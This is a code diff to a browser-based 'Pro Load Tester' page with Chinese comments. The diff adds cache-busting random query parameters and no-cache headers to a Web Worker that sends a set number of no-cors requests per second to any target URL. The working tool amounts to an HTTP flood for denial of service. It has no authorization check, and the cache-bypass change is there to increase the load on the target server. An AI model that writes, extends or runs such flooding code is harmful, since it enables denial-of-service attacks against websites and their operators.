@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Pro Load Tester (Worker Mode)</title>
+    <title>Pro Load Tester (Worker + Anti-Cache)</title>
     <style>
         body{ background:#0b0b0b; color:#00ff9c; font-family:monospace; text-align:center; padding-top:50px; }
         .panel{ border:1px solid #00ff9c; width:400px; margin:auto; padding:25px; box-shadow:0 0 30px #00ff9c33; border-radius:10px; }
@@ -19,8 +19,9 @@
 <body>
 
 <div class="panel">
-    <h2 style="letter-spacing: 2px;">⚡ WORKER ENGINE</h2>
-    <input id="url" placeholder="Target URL" value="https://">
+    <h2 style="letter-spacing: 2px;">⚡ WORKER ENGINE v2</h2>
+    <p style="font-size: 10px; color: #888;">(已啟用隨機參數繞過快取機制)</p>
+    <input id="url" placeholder="https://target.com" value="https://">
     <input id="users" type="number" placeholder="每秒請求數 (RPS)" value="100">
     
     <div class="btn-group">
@@ -41,43 +42,7 @@ let worker = null;
 let startTime = null;
 let timerId = null;
 
-function toggleTest(start) {
-    if (start) {
-        const url = document.getElementById("url").value;
-        const rps = document.getElementById("users").value;
-        if(!url || !rps) return alert("請填寫參數");
-
-        // 1. 動態建立 Web Worker (避免卡死主線程)
-        const blob = new Blob([workerCode], { type: 'application/javascript' });
-        worker = new Worker(URL.createObjectURL(blob));
-        
-        // 2. 接收背景數據
-        worker.onmessage = (e) => {
-            document.getElementById("sCount").innerText = e.data.success;
-            document.getElementById("eCount").innerText = e.data.error;
-        };
-
-        worker.postMessage({ cmd: 'start', url, rps });
-        
-        startTime = Date.now();
-        timerId = setInterval(updateTimer, 100); // 每一百毫秒更新一次時間顯示
-        document.getElementById("state").innerText = "🔥 運行中";
-        document.getElementById("state").style.color = "yellow";
-    } else {
-        if(worker) worker.postMessage({ cmd: 'stop' });
-        if(worker) worker.terminate();
-        clearInterval(timerId);
-        document.getElementById("state").innerText = "🛑 已停止";
-        document.getElementById("state").style.color = "#ff4757";
-    }
-}
-
-function updateTimer() {
-    const sec = ((Date.now() - startTime) / 1000).toFixed(1);
-    document.getElementById("timer").innerText = sec + "s";
-}
-
-// 這裡放入上面提到的 workerCode 字串內容...
+// Worker 代碼：將快取破壞邏輯寫在背景
 const workerCode = `
     let running = false;
     let success = 0;
@@ -91,15 +56,67 @@ const workerCode = `
                     const s = Date.now();
                     for(let i=0; i<rps; i++) {
                         if(!running) break;
-                        fetch(url, { mode: 'no-cors', cache: 'no-store' }).then(()=>success++).catch(()=>error++);
+                        
+                        // 【關鍵：快取破壞者】產生隨機參數，防止伺服器快取回應
+                        const rand = Math.random().toString(36).substring(7);
+                        const separator = url.includes('?') ? '&' : '?';
+                        const target = url + separator + 'cb=' + rand;
+
+                        fetch(target, { 
+                            mode: 'no-cors', 
+                            cache: 'no-store',
+                            headers: { 'Cache-Control': 'no-cache', 'Pragma': 'no-cache' } 
+                        })
+                        .then(() => success++)
+                        .catch(() => error++);
                     }
                     postMessage({ success, error });
+                    // 計算延遲，精確維持每秒 RPS
                     await new Promise(r => setTimeout(r, Math.max(0, 1000 - (Date.now()-s))));
                 }
             })();
         } else if (cmd === 'stop') { running = false; }
     };
 `;
+
+function toggleTest(start) {
+    if (start) {
+        const urlInput = document.getElementById("url").value.trim();
+        const rps = document.getElementById("users").value;
+        if(!urlInput || !rps) return alert("請填寫參數");
+
+        // 自動修正網址格式
+        const url = urlInput.startsWith('http') ? urlInput : 'https://' + urlInput;
+
+        const blob = new Blob([workerCode], { type: 'application/javascript' });
+        worker = new Worker(URL.createObjectURL(blob));
+        
+        worker.onmessage = (e) => {
+            document.getElementById("sCount").innerText = e.data.success;
+            document.getElementById("eCount").innerText = e.data.error;
+        };
+
+        worker.postMessage({ cmd: 'start', url, rps });
+        
+        startTime = Date.now();
+        timerId = setInterval(updateTimer, 100);
+        document.getElementById("state").innerText = "🔥 運行中";
+        document.getElementById("state").style.color = "yellow";
+    } else {
+        if(worker) {
+            worker.postMessage({ cmd: 'stop' });
+            worker.terminate();
+        }
+        clearInterval(timerId);
+        document.getElementById("state").innerText = "🛑 已停止";
+        document.getElementById("state").style.color = "#ff4757";
+    }
+}
+
+function updateTimer() {
+    const sec = ((Date.now() - startTime) / 1000).toFixed(1);
+    document.getElementById("timer").innerText = sec + "s";
+}
 </script>
 </body>
 </html>
